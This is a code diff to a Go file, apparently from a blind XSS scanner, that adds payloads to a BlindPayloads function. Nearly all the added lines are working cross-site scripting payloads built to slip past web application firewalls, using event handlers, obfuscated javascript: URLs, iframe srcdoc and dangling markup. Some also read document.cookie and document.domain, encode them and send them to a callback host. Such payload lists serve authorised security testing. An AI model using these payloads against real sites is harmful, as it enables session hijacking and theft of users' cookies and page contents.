@@ -45,7 +45,7 @@ func GenerateUniqueCallback(baseURL, identifier string) string {
 
 // BlindPayloads returns an expanded list of blind XSS payloads using the callback URL
 func BlindPayloads(callbackURL string) []string {
-	return []string{
+	payloads := []string{
 		// Script injection
 		fmt.Sprintf("<script src=%s></script>", callbackURL),
 		fmt.Sprintf("<script>fetch('%s')</script>", callbackURL),
@@ -77,7 +77,40 @@ func BlindPayloads(callbackURL string) []string {
 
 		// Meta refresh
 		fmt.Sprintf("<meta http-equiv=refresh content='0;url=%s'>", callbackURL),
+
+		// === Modern WAF Bypass & Obfuscation ===
+
+		// Details Toggle (Chrome/Webkit)
+		fmt.Sprintf("<details ontoggle=fetch('%s')>open", callbackURL),
+
+		// Isindex (Old but sometimes works)
+		fmt.Sprintf("<isindex formaction=%s>", callbackURL),
+
+		// Obfuscated JavaScript URL (Newlines)
+		fmt.Sprintf("j%%0Aavas%%0Dcript:fetch('%s')", callbackURL),
+
+		// SVG with multiple event handlers
+		fmt.Sprintf("<svg><animate onbegin=fetch('%s') attributeName=x dur=1s>", callbackURL),
+
+		// Body onload (if injected in head)
+		fmt.Sprintf("<body onload=fetch('%s')>", callbackURL),
+
+		// Iframe srcdoc
+		fmt.Sprintf("<iframe srcdoc=\"<img src=x onerror=fetch('%s')>\"></iframe>", callbackURL),
+
+		// === Data Exfiltration (Base64 encoded domain/cookies) ===
+		// Note: We append a random param to avoid caching
+		fmt.Sprintf("<script>fetch('%s?d='+btoa(document.domain)+'&c='+btoa(document.cookie))</script>", callbackURL),
+		fmt.Sprintf("<img src=x onerror=this.src='%s?d='+btoa(document.domain)>", callbackURL),
+
+		// Dangling Markup (Unclosed) - Exfiltrates subsequent HTML
+		fmt.Sprintf("<img src='%s?", callbackURL),
 	}
+
+	// Append Polyglots
+	payloads = append(payloads, GetPolyglots(callbackURL)...)
+
+	return payloads
 }
 
 // BlindPayloadsForContext returns context-specific blind XSS payloads
